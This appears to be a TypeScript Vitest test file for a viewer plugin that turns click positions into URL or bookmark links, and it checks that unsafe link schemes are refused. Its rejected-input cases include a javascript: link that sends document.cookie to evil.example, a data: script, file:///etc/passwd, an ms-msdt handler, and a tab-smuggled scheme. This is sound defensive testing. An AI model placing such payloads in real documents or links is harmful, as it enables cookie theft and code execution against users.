/**
 * plugin-links tests.
 *
 * links.linkAt is a PURE decision: given a content coordinate {page,x,y} it
 * returns what a click there activates — a {kind:'url',href} over a url rect, a
 * {kind:'anchor',name,page,y} over an anchor rect (resolving the bookmark via
 * viewer.bookmarkPosition), or null (miss, or a dead bookmark). These tests stub
 * the Viewer's linkRects + bookmarkPosition — no real engine. The activation
 * POLICY (window.open / scroll / veto) lives in the consumer applier, NOT here.
 */
import { describe, it, expect } from "vitest";
import type { Viewer, BookmarkPosition } from "@parasma/core";
import { createKernel } from "../kernel";
import { linksPlugin, type LinkDecision } from "./links";

type Rect = { x: number; y: number; w: number; h: number; target: string };

interface StubConfig {
  links?: Rect[];
  /** name → resolved position; absent / null means a dead bookmark. */
  bookmarks?: Record<string, BookmarkPosition | null>;
}

/** A stub Viewer exposing only the hit-tests links.linkAt reads. */
function stubViewer(cfg: StubConfig): Viewer {
  return {
    linkRects: (_idx: number) => (cfg.links ?? []).map((r) => ({ ...r })),
    bookmarkPosition: (name: string) => cfg.bookmarks?.[name] ?? null,
  } as unknown as Viewer;
}

async function boot(stub: StubConfig) {
  const kernel = createKernel();
  kernel.use(linksPlugin(stubViewer(stub)));
  await kernel.boot();
  return kernel;
}

const linkAt = (kernel: Awaited<ReturnType<typeof boot>>, x: number, y: number) =>
  kernel.exec("links.linkAt", { page: 0, x, y });

describe("plugin-links", () => {
  it("returns {kind:'url',href} over a url rect", async () => {
    const kernel = await boot({
      links: [{ x: 10, y: 10, w: 50, h: 20, target: "url:https://example.com" }],
    });
    expect(await linkAt(kernel, 20, 15)).toEqual({
      kind: "url",
      href: "https://example.com",
    });
  });

  // ─── the activation path is allowlisted ────────────────────────────────
  // An earlier `linkAt` returned the href RAW and only the CLIPBOARD flavor
  // sanitized, so these reached `window.open` unfiltered. Each case below is a
  // vector that was demonstrated end-to-end against that version.
  it.each([
    ["javascript:", "url:javascript:fetch('https://evil.example/'+document.cookie)"],
    ["a scheme-less relative target (resolves against the HOST origin)", "url:admin/purge?confirm=1"],
    ["data:", "url:data:text/html,<script>alert(1)</script>"],
    ["file:", "url:file:///etc/passwd"],
    ["an OS-handler scheme", "url:ms-msdt:/id PCWDiagnostic"],
    ["a control char smuggling a scheme", "url:java\tscript:alert(1)"],
  ])("refuses %s — a rejected link is not a link", async (_label, target) => {
    const kernel = await boot({ links: [{ x: 0, y: 0, w: 100, h: 30, target }] });
    expect(await linkAt(kernel, 50, 15)).toBeNull();
  });

  it.each([
    ["https", "url:https://example.com/safe"],
    ["http", "url:http://example.com/safe"],
    ["mailto", "url:mailto:someone@example.com"],
    ["tel", "url:tel:+15551234"],
  ])("still allows %s", async (_label, target) => {
    const kernel = await boot({ links: [{ x: 0, y: 0, w: 100, h: 30, target }] });
    expect(await linkAt(kernel, 50, 15)).toEqual({ kind: "url", href: target.slice(4) });
  });

  it("does NOT let a rejected url fall back to an anchor (§17.16.22 precedence)", async () => {
    // A rejected r:id must not resurface as bookmark navigation — the engine
    // stamps ONE target per item, and a refused url yields no link at all.
    const kernel = await boot({
      links: [{ x: 0, y: 0, w: 100, h: 30, target: "url:javascript:alert(1)" }],
      bookmarks: { Heading1: { page: 3, y: 240 } },
    });
    expect(await linkAt(kernel, 50, 15)).toBeNull();
  });

  it("returns {kind:'anchor',name,page,y} over an anchor rect with a resolving bookmark", async () => {
    const kernel = await boot({
      links: [{ x: 0, y: 0, w: 100, h: 30, target: "anchor:Heading1" }],
      bookmarks: { Heading1: { page: 3, y: 240 } },
    });
    expect(await linkAt(kernel, 50, 15)).toEqual({
      kind: "anchor",
      name: "Heading1",
      page: 3,
      y: 240,
    });
  });

  it("returns null over an anchor rect whose bookmark is dead (no target)", async () => {
    const kernel = await boot({
      links: [{ x: 0, y: 0, w: 100, h: 30, target: "anchor:Missing" }],
      bookmarks: {}, // Missing resolves to null
    });
    expect(await linkAt(kernel, 50, 15)).toBeNull();
  });

  it("returns null when no rect contains the point (miss)", async () => {
    const kernel = await boot({
      links: [{ x: 10, y: 10, w: 50, h: 20, target: "url:https://example.com" }],
    });
    expect(await linkAt(kernel, 500, 500)).toBeNull();
  });

  it("returns null when there are no link rects at all", async () => {
    const kernel = await boot({});
    expect(await linkAt(kernel, 5, 5)).toBeNull();
  });

  it("hits on the inclusive bounds edge (x === r.x + r.w, y === r.y + r.h)", async () => {
    const kernel = await boot({
      links: [{ x: 10, y: 10, w: 50, h: 20, target: "url:https://edge" }],
    });
    // Exact bottom-right corner — contains() is inclusive (mirrors cursor).
    expect(await linkAt(kernel, 60, 30)).toEqual({ kind: "url", href: "https://edge" });
  });

  it("returns null for an unknown target prefix", async () => {
    const kernel = await boot({
      links: [{ x: 0, y: 0, w: 100, h: 30, target: "mailto:nope@x" }],
    });
    expect(await linkAt(kernel, 50, 15)).toBeNull();
  });

  it("first rect under the point wins", async () => {
    const kernel = await boot({
      links: [
        { x: 0, y: 0, w: 100, h: 100, target: "url:https://first" },
        { x: 0, y: 0, w: 100, h: 100, target: "url:https://second" },
      ],
    });
    expect(await linkAt(kernel, 50, 50)).toEqual({ kind: "url", href: "https://first" });
  });
});
